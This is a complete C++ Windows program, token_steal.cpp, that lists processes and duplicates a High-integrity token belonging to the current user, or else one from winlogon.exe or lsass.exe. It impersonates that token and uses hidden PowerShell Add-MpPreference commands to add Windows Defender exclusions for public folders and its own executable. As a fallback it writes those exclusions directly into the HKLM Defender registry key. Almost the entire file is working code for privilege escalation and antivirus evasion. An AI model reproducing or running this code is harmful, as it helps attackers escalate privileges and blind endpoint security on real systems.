/*
    Token Impersonation -> Elevated Process -> Defender Exclusion

    Flow:
      1. Enumerate all processes
      2. Find one running at High integrity under current user
      3. Duplicate its token
      4. Spawn elevated cmd.exe with that token
      5. Add Defender exclusion from elevated context

    Compile:
      cmd /c "vcvars64.bat && cl.exe token_steal.cpp /EHsc /link advapi32.lib /out:token_steal.exe"
*/

#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <shellapi.h>
#include <stdio.h>
#include <string>
#include <ctime>

#pragma comment(lib, "advapi32.lib")

// ─── Logging ─────────────────────────────────────────────────────────────────

FILE* gLog = nullptr;

void InitLog(const char* path) {
    gLog = fopen(path, "w");
    if (!gLog) printf("[!] Could not open log: %s\n", path);
}

void Log(const char* lvl, const char* fmt, ...) {
    char buf[2048];
    va_list a; va_start(a, fmt);
    vsnprintf(buf, sizeof(buf), fmt, a);
    va_end(a);
    time_t t = time(nullptr);
    struct tm* ti = localtime(&t);
    char ts[32]; strftime(ts, sizeof(ts), "%H:%M:%S", ti);
    printf("[%s] [%s] %s\n", ts, lvl, buf); fflush(stdout);
    if (gLog) { fprintf(gLog, "[%s] [%s] %s\n", ts, lvl, buf); fflush(gLog); }
}

#define INFO(f,...) Log("INFO ", f, ##__VA_ARGS__)
#define OK(f,...)   Log("OK   ", f, ##__VA_ARGS__)
#define WARN(f,...) Log("WARN ", f, ##__VA_ARGS__)
#define ERR(f,...)  Log("ERROR", f, ##__VA_ARGS__)
#define DBG(f,...)  Log("DEBUG", f, ##__VA_ARGS__)

void WinErr(const char* ctx) {
    DWORD e = GetLastError();
    char m[512]={};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr,e,0,m,sizeof(m),nullptr);
    for(int i=strlen(m)-1;i>=0&&(m[i]=='\r'||m[i]=='\n');i--) m[i]=0;
    ERR("%s failed — %lu: %s", ctx, e, m);
}

// ─── Get integrity level of a token ──────────────────────────────────────────

DWORD GetTokenIntegrity(HANDLE hToken) {
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);
    if (!dwLen) return 0;
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
    if (!pTIL) return 0;
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen)) {
        LocalFree(pTIL); return 0;
    }
    DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
    LocalFree(pTIL);
    return level;
}

const char* IntegrityName(DWORD l) {
    if (l < 0x1000) return "Untrusted";
    if (l < 0x2000) return "Low";
    if (l < 0x3000) return "Medium";
    if (l < 0x4000) return "High";
    return "System";
}

// ─── Get current user SID as string ──────────────────────────────────────────

std::string GetCurrentUserSid() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return "";
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLen);
    PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(0, dwLen);
    if (!pUser) { CloseHandle(hToken); return ""; }
    GetTokenInformation(hToken, TokenUser, pUser, dwLen, &dwLen);
    LPSTR sidStr = nullptr;
    ConvertSidToStringSidA(pUser->User.Sid, &sidStr);
    std::string result = sidStr ? sidStr : "";
    if (sidStr) LocalFree(sidStr);
    LocalFree(pUser);
    CloseHandle(hToken);
    return result;
}

// ─── Check if a process token belongs to current user ────────────────────────

bool IsCurrentUser(HANDLE hToken) {
    std::string mySid = GetCurrentUserSid();
    if (mySid.empty()) return false;

    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLen);
    if (!dwLen) return false;
    PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(0, dwLen);
    if (!pUser) return false;
    if (!GetTokenInformation(hToken, TokenUser, pUser, dwLen, &dwLen)) {
        LocalFree(pUser); return false;
    }
    LPSTR sidStr = nullptr;
    ConvertSidToStringSidA(pUser->User.Sid, &sidStr);
    bool match = sidStr && (mySid == sidStr);
    if (sidStr) LocalFree(sidStr);
    LocalFree(pUser);
    return match;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main() {
    InitLog("C:\\exclusiontest\\token_log.txt");
    INFO("=== Token Impersonation -> Elevation ===");

    // Show our own integrity
    HANDLE hSelf = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hSelf);
    DWORD myLevel = GetTokenIntegrity(hSelf);
    CloseHandle(hSelf);
    INFO("Current process integrity: 0x%04lX (%s)", myLevel, IntegrityName(myLevel));
    INFO("Current user SID: %s", GetCurrentUserSid().c_str());

    // Enable SeDebugPrivilege — needed to open some processes
    INFO("Enabling SeDebugPrivilege...");
    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) {
        LUID luid;
        if (LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &luid)) {
            TOKEN_PRIVILEGES tp = {};
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr))
                OK("SeDebugPrivilege enabled");
            else
                WARN("AdjustTokenPrivileges failed — may not be able to open all processes");
        }
        CloseHandle(hToken);
    }

    // Snapshot all processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        WinErr("CreateToolhelp32Snapshot"); return 1;
    }

    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);

    HANDLE hBestToken = nullptr;
    DWORD  bestPid    = 0;
    char   bestName[MAX_PATH] = {};
    DWORD  bestLevel  = 0;

    INFO("Scanning processes for High integrity token owned by current user...");
    INFO("%-30s %6s  %s", "Name", "PID", "Integrity");
    INFO("%-30s %6s  %s", "------------------------------", "------", "---------");

    if (Process32First(hSnap, &pe)) {
        do {
            // PROCESS_QUERY_LIMITED_INFORMATION works cross-integrity
            // PROCESS_QUERY_INFORMATION may be blocked by Medium->High boundary
            HANDLE hProc = OpenProcess(
                PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            // First open with limited rights to check integrity/user
            HANDLE hTokCheck = nullptr;
            OpenProcessToken(hProc, TOKEN_QUERY, &hTokCheck);

            HANDLE hTok = nullptr; // will hold duplicatable token if we want this process

            if (hTokCheck) {
                DWORD level = GetTokenIntegrity(hTokCheck);
                bool isUser = IsCurrentUser(hTokCheck);
                CloseHandle(hTokCheck);

                if (level >= 0x3000) {
                    INFO("  %-28s %6lu  %-8s  %s",
                         pe.szExeFile, pe.th32ProcessID,
                         IntegrityName(level),
                         isUser ? "<-- owned by us" : "");
                }

                // Try to get a duplicatable token for this process
                if (level >= 0x3000 && level < 0x4000 && isUser && !hBestToken) {
                    // Need TOKEN_DUPLICATE — try opening the token with full rights
                    if (OpenProcessToken(hProc,
                            TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok)) {
                        HANDLE hDup = nullptr;
                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
                                SecurityImpersonation, TokenPrimary, &hDup)) {
                            hBestToken = hDup;
                            bestPid    = pe.th32ProcessID;
                            bestLevel  = level;
                            strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
                            OK("Selected + duplicated: %s (PID %lu)", bestName, bestPid);
                        } else {
                            DBG("DuplicateTokenEx failed for %s (PID %lu) error %lu",
                                pe.szExeFile, pe.th32ProcessID, GetLastError());
                        }
                        CloseHandle(hTok);
                    } else {
                        DBG("OpenProcessToken (full rights) failed for %s (PID %lu) error %lu",
                            pe.szExeFile, pe.th32ProcessID, GetLastError());
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);

    if (!hBestToken) {
        // No High user-owned process found — try System-level (need SeDebugPrivilege)
        WARN("No High integrity user process found — trying System processes...");
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "winlogon.exe") != 0 &&
                    _stricmp(pe.szExeFile, "lsass.exe")    != 0) continue;

                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!hProc) continue;
                HANDLE hTok = nullptr;
                if (OpenProcessToken(hProc,
                    TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok)) {
                    DWORD level = GetTokenIntegrity(hTok);
                    if (level >= 0x4000 && !hBestToken) {
                        hBestToken = hTok;
                        bestPid = pe.th32ProcessID;
                        bestLevel = level;
                        strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
                        OK("Selected System process: %s (PID %lu)", bestName, bestPid);
                        hTok = nullptr; // don't close
                    }
                }
                if (hTok) CloseHandle(hTok);
                CloseHandle(hProc);
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (!hBestToken) {
        ERR("Could not find any suitable token to duplicate.");
        ERR("Try running from an elevated prompt or enable SeDebugPrivilege.");
        goto done;
    }

    // Duplicate as impersonation token
    INFO("Duplicating token from %s (PID %lu)...", bestName, bestPid);
    HANDLE hImpToken = nullptr;
    if (!DuplicateTokenEx(hBestToken,
        TOKEN_ALL_ACCESS, nullptr,
        SecurityImpersonation, TokenImpersonation, &hImpToken)) {
        WinErr("DuplicateTokenEx (impersonation)");
        CloseHandle(hBestToken);
        goto done;
    }
    OK("Impersonation token duplicated");

    // Also duplicate as primary for CreateProcessWithTokenW via advapi32 trick
    HANDLE hPriToken = nullptr;
    DuplicateTokenEx(hBestToken, TOKEN_ALL_ACCESS, nullptr,
        SecurityImpersonation, TokenPrimary, &hPriToken);
    CloseHandle(hBestToken);

    // Impersonate the High integrity token on this thread
    INFO("Impersonating High integrity token...");
    if (!ImpersonateLoggedOnUser(hImpToken)) {
        WinErr("ImpersonateLoggedOnUser");
        CloseHandle(hImpToken);
        if (hPriToken) CloseHandle(hPriToken);
        goto done;
    }
    OK("Impersonation active — now running as High integrity");

    // Try to call Add-MpPreference via WMI/COM under the impersonated token
    // We use ShellExecuteEx which respects the thread token
    INFO("Running Add-MpPreference under impersonated token...");
    {
        char psCmd[] =
            "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
            "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
            "Add-MpPreference -ExclusionProcess 'token_steal.exe' -Force; "
            "Write-Output 'done' | Out-File C:\\exclusiontest\\exclusion_result.txt";

        char fullCmd[1024];
        snprintf(fullCmd, sizeof(fullCmd),
            "powershell.exe -NoProfile -WindowStyle Hidden -Command \"%s\"", psCmd);
        DBG("Command: %s", fullCmd);

        SHELLEXECUTEINFOA sei = {};
        sei.cbSize = sizeof(sei);
        sei.fMask  = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
        sei.lpVerb = "runas";
        sei.lpFile = "powershell.exe";
        sei.lpParameters =
            "-NoProfile -WindowStyle Hidden -Command \""
            "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
            "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
            "Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"";
        sei.nShow = SW_HIDE;

        if (ShellExecuteExA(&sei)) {
            OK("ShellExecuteEx launched (PID via hProcess)");
            if (sei.hProcess) {
                WaitForSingleObject(sei.hProcess, 8000);
                CloseHandle(sei.hProcess);
            }
        } else {
            WinErr("ShellExecuteEx");

            // Last resort: direct registry write under impersonated token
            // At High integrity we can write to HKLM Defender exclusions directly
            INFO("Trying direct registry write to Defender exclusions...");
            HKEY hKey = nullptr;
            LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
                0, KEY_SET_VALUE, &hKey);
            if (res == ERROR_SUCCESS) {
                DWORD val = 0;
                RegSetValueExA(hKey, "C:\\Users\\Public", 0, REG_DWORD,
                               (const BYTE*)&val, sizeof(val));
                RegSetValueExA(hKey, "C:\\exclusiontest", 0, REG_DWORD,
                               (const BYTE*)&val, sizeof(val));
                RegCloseKey(hKey);
                OK("Registry exclusions written directly to HKLM Defender!");

                FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "w");
                if (f) { fprintf(f, "done via registry\n"); fclose(f); }
            } else {
                ERR("RegOpenKeyEx HKLM Defender failed: %ld", res);
            }
        }

        RevertToSelf();
        INFO("Reverted impersonation");
    }

    // Check result
    {
        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
        if (f) {
            char buf[256]={};
            fgets(buf, sizeof(buf), f);
            fclose(f);
            OK("Result file contents: %s", buf);
            OK("SUCCESS — check exclusions with: Get-MpPreference | Select ExclusionPath");
        } else {
            WARN("No result file found");
            WARN("Verify manually: Get-MpPreference | Select ExclusionPath");
        }
    }

    if (hImpToken) CloseHandle(hImpToken);
    if (hPriToken) CloseHandle(hPriToken);

done:
    INFO("Log saved to C:\\exclusiontest\\token_log.txt");
    if (gLog) fclose(gLog);
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}
